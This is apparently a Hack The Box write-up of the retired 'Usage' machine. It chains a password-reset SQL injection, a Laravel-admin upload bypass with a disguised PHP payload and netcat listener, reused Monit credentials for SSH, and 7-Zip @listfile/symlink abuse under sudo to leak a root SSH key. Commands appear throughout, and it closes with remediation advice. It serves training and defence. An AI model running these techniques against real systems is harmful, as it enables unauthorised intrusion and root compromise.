---
title: "Usage — SQL Injection to Root via Laravel-admin Upload Bypass and 7-Zip Wildcard Abuse"
seoTitle: "Usage — SQL Injection to Root via Laravel-admin Upload and 7-Zip Abuse"
description: "SQL injection in a password-reset workflow and a Laravel-admin upload-validation bypass provide a foothold; reused Monit credentials enable SSH, and wildcard and @listfile handling in a sudo 7-Zip backup reach a protected root key."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - sql-injection
  - file-upload
  - credential-reuse
  - privilege-escalation
  - 7zip
objective: "Escalate from an unauthenticated password-reset SQL injection to root through an authenticated upload-validation bypass, reused service credentials, and privileged archive handling."
tools:
  - nmap
  - feroxbuster
  - gobuster
  - sqlmap
  - hashcat
  - netcat
  - mime-file-forge
skill: "Linux web exploitation and privilege escalation through SQL injection, upload-validation bypass, and wildcard-driven archive abuse"
outcome: "Root access via a disclosed root SSH private key obtained through privileged 7-Zip @listfile and wildcard handling"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; nginx 1.18.0 fronting a Laravel 10 application |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated password-reset SQL injection to root through an authenticated upload-validation bypass, reused service credentials, and privileged archive handling |
| Outcome | Root access via a disclosed root SSH private key obtained through privileged 7-Zip `@listfile` and wildcard handling |

## Password-reset SQLi to 7-Zip listfile root

Usage is an Easy-rated, retired Hack The Box Linux lab running an nginx-hosted Laravel application. A password-reset workflow is vulnerable to SQL injection, which exposes the `usage_blog` database and the Laravel-admin account hash; the recovered password unlocks an administrative virtual host whose file-upload validation is bypassed to execute a payload as a local user. Local enumeration then recovers Monit service credentials that are reused for SSH access to a second local account, and a passwordless sudo backup binary that invokes `7za` with a wildcard expands an `@` list file into disclosure of the root SSH private key. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves the command syntax. See [how evidence is handled](/method/).

**Attack path:** **Password-reset SQL injection → administrative credential recovery → authenticated upload-validation bypass (CVE-2023-24249) → code execution as a local user → Monit credential reuse over SSH → passwordless sudo 7-Zip backup → `@listfile` and wildcard abuse → root SSH key disclosure → root**

## Ubuntu nginx fronting Laravel, web surface to root

- **Target:** an Ubuntu Linux host exposing SSH (OpenSSH 8.9p1) and HTTP (nginx 1.18.0) fronting a Laravel 10.18.0 application.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** identify the web attack surface, obtain a foothold, and assess local privilege-escalation paths to administrative control.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: password-reset SQLi, admin upload bypass, and 7za listfile

### 1. Service and Virtual-Host Enumeration

Observation: a full TCP scan exposes SSH and HTTP, and the web service redirects to a virtual host.

Action: scan the target, then enumerate web paths and virtual hosts.

```bash
nmap <TARGET_IP> -p- -Pn -sC -sV -oN <SCAN_OUTPUT>
feroxbuster --url http://<TARGET_HOST> --wordlist <WEB_CONTENT_WORDLIST>
gobuster vhost --url http://<TARGET_HOST> --wordlist <DNS_WORDLIST> --append-domain
```

Truncated scan output:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://<TARGET_HOST>/
```

Discovery results:

```text
feroxbuster => http://<TARGET_HOST>/forget-password
gobuster vhost => admin.<TARGET_HOST>
```

Significance: virtual-host routing exposes application components that the default host does not serve, and the scan separates a password-reset endpoint from a separate administrative interface.

Result: a password-reset endpoint and an administrative virtual host are identified.

### 2. Password-Reset SQL Injection and Credential Recovery

Observation: the `email` parameter in the password-reset request is injectable, and a threaded dump corrupts part of the stored bcrypt value.

Action: I confirmed the backend database, enumerated its databases and tables, dumped the administrative-user row, then checked that row directly with length and hexadecimal output to obtain the full hash before offline cracking.

```bash
sqlmap -r <REQUEST_FILE> -p email --batch --level 3 --dbs --threads 10
sqlmap -r <REQUEST_FILE> -p email --batch --level 3 -D usage_blog --tables --threads 10
sqlmap -r <REQUEST_FILE> -p email --batch --level 3 --threads 10 \
  --sql-query="SELECT id,username,password,LENGTH(password),HEX(password) FROM usage_blog.admin_users WHERE username='admin'"
hashcat <HASH_FILE> <WORDLIST> -D 2 -m 3200
```

Backend identification:

```text
back-end DBMS: MySQL >= 8.0.0
available databases [3]:
[*] usage_blog
...
```

Validated row from the direct query:

```text
1,admin,<BCRYPT_HASH>,60,<HEX_ENCODED_HASH>
```

Significance: threaded blind dumps can corrupt part of a stored hash and return a wrong value, so cross-checking the stored value's length and byte representation avoids spending cracking effort on a truncated hash.

Result: the validated bcrypt hash cracks offline to the administrative account password, which authenticates to the administrative panel.

### 3. Authenticated Upload-Validation Bypass

Observation: the recovered credential authenticates to the Laravel-admin panel, which reports its runtime versions and exposes a file-upload function.

```text
Laravel version 10.18.0
PHP version     8.1.2-1ubuntu2.14
Server          nginx/1.18.0
```

Action: build a PHP payload disguised as a JPEG, upload it through the admin upload function while changing the filename extension in transit, and trigger the uploaded file with a listener running.

```bash
python3 <FILE_FORGE_TOOL> forge --payload-file <SERVER_SIDE_PAYLOAD> --type jpg --output <IMAGE_FILE> --separator newline
nc -nlvp <LISTENER_PORT>
```

Shell received:

```text
<LOW_PRIVILEGE_USER>@<TARGET_HOST>:/$ id
uid=1000(<LOW_PRIVILEGE_USER>) gid=1000(<LOW_PRIVILEGE_USER>) groups=1000(<LOW_PRIVILEGE_USER>)
```

Significance: upload handling that trusts a client-supplied filename or a superficial type check lets a web-accessible upload execute server-side code; this weakness is tracked as CVE-2023-24249 for laravel-admin.

Result: command execution as a low-privilege local user is obtained.

### 4. Monit Credentials and SSH Access to a Second Account

Observation: the low-privilege user's home directory holds Monit configuration, and the `.monitrc` file is readable by that user and contains the service's HTTP credentials.

Action: enumerate the home directory, read the Monit configuration, and test the recovered password for SSH access to a second local account.

```bash
ls -la /home/<LOW_PRIVILEGE_USER>
cat ~/.monitrc
ssh <SECOND_USER>@<TARGET_HOST>
```

Truncated listing and configuration:

```text
-rwx------ 1 <LOW_PRIVILEGE_USER> <LOW_PRIVILEGE_USER>  707 Oct 26  2023 .monitrc
set httpd port 2812
     allow <MONIT_USER>:<MONIT_PASSWORD>
```

Authenticated session:

```text
<SECOND_USER>@<TARGET_HOST>:~$ id
uid=1001(<SECOND_USER>) gid=1001(<SECOND_USER>) groups=1001(<SECOND_USER>)
```

Significance: a credential stored in a user-readable service configuration file moves access from a local service to an operating-system account when the same password is reused.

Result: the Monit service password authenticates the second local account over SSH.

### 5. Privileged Backup Path Discovery

Observation: the second user may run a custom management binary as root without a password, and its embedded strings show a project-backup step that calls `7za` with a wildcard.

Action: enumerate the permitted sudo commands and inspect the binary's embedded strings.

```bash
sudo -l
strings /usr/bin/<MANAGEMENT_BINARY>
```

Truncated output:

```text
(ALL : ALL) NOPASSWD: /usr/bin/<MANAGEMENT_BINARY>
/usr/bin/7za a <BACKUP_ARCHIVE> -tzip -snl -mmt -- *
```

Significance: wildcard expansion inside a privileged archive command lets filenames in a writable directory influence what the archive reads.

Result: a passwordless sudo path runs a backup operation that expands a wildcard.

### 6. 7-Zip List-File Abuse and Root Key Disclosure

Observation: because the backup runs from a writable directory and expands `*`, 7-Zip's `@` list-file handling can be pointed at a symlinked protected file.

Action: create an `@` list-file reference and a symlink to the root SSH key in the writable directory, then run the management binary and select the project-backup option.

```bash
cd <WRITABLE_PROJECT_DIRECTORY>
touch -- @<LIST_FILE>
ln -s <PROTECTED_KEY_PATH> <LIST_FILE>
sudo /usr/bin/<MANAGEMENT_BINARY>
```

The privileged backup prints the referenced file:

```text
Choose an option:
1. Project Backup
...
-----BEGIN OPENSSH PRIVATE KEY-----
<REDACTED_KEY_MATERIAL>
-----END OPENSSH PRIVATE KEY-----
```

Action: save the disclosed key with restricted permissions and authenticate as root.

```bash
chmod 600 <ROOT_KEY_FILE>
ssh root@<TARGET_HOST> -i <ROOT_KEY_FILE>
```

```text
root@<TARGET_HOST>:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Significance: `@listfile` processing turns wildcard-driven archive input into arbitrary-file disclosure when a privileged process reads attacker-controlled names.

Result: the root SSH private key is disclosed and used to obtain root.

## Corrupted dump, filename check, and the wildcard backup

| Challenge | Decision | Rationale |
|---|---|---|
| A threaded `sqlmap` dump corrupted part of the stored bcrypt value | Re-queried the row directly with `LENGTH()` and `HEX()` before cracking | A direct query yields the complete value and avoids cracking a truncated hash |
| Upload validation accepted only image types | Changed the uploaded filename extension in transit | The check trusted the client-supplied filename |
| The privileged backup expanded a wildcard in a writable directory | Created an `@` list file and a symlink to a protected file | `7za` reads `@`-prefixed arguments as list files, so the wildcard traversal exposed the symlink target |

## Outcome: root via disclosed 7-Zip listfile SSH key

The documented result is root access through a disclosed root SSH private key recovered from privileged 7-Zip `@listfile` and wildcard handling; the recovered credential, hash, and key values are omitted, so the secrets are not reproducible from this writeup.

## Recommendations: password-reset SQLi, upload bypass, credential reuse, and the wildcard backup

These recommendations were not validated during the exercise.

1. **SQL injection in the password-reset workflow.** The `email` parameter is used to build a database query, exposing the application database and the administrative credential. *Recommendation:* bind user input with parameterized queries instead of constructing SQL from request values. *Detection:* flag SQL-metacharacter patterns and enumeration-heavy queries from a single source.
2. **Upload-validation bypass (CVE-2023-24249).** A web-accessible upload accepted a PHP payload renamed as an image, yielding code execution. *Recommendation:* validate uploads server-side, store them outside executable web paths, and track upstream releases for the management panel. *Detection:* monitor executable file types appearing under upload directories.
3. **Service credential reuse.** A Monit password stored in a user-readable `.monitrc` authenticated a different local account over SSH. *Recommendation:* issue unique credentials per account and service, and restrict configuration-file readability. *Detection:* investigate successful logins where a service credential is used on an account it does not own.
4. **Wildcard input in a privileged backup.** A root-run backup expanded a wildcard from a writable directory, turning `@listfile` handling into arbitrary-file disclosure. *Recommendation:* avoid wildcard expansion in privileged commands and pass explicit, controlled file lists. *Detection:* review sudo-allowed commands and monitor privileged backup invocations for attacker-controlled filenames.

## References

- [Hack The Box — Usage](https://app.hackthebox.com/machines/Usage) (retired machine)
- [NVD — CVE-2023-24249](https://nvd.nist.gov/vuln/detail/CVE-2023-24249) (laravel-admin arbitrary file upload, CWE-434)
- [GitHub Advisory — GHSA-g857-47pm-3r32](https://github.com/advisories/GHSA-g857-47pm-3r32) (laravel-admin arbitrary file upload advisory)
- [laravel-admin project (z-song/laravel-admin)](https://github.com/z-song/laravel-admin)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [feroxbuster](https://github.com/epi052/feroxbuster)
- [Gobuster](https://github.com/OJ/gobuster)
- [sqlmap](https://sqlmap.org/)
- [hashcat](https://hashcat.net/hashcat/)
- [7-Zip](https://7-zip.org/)
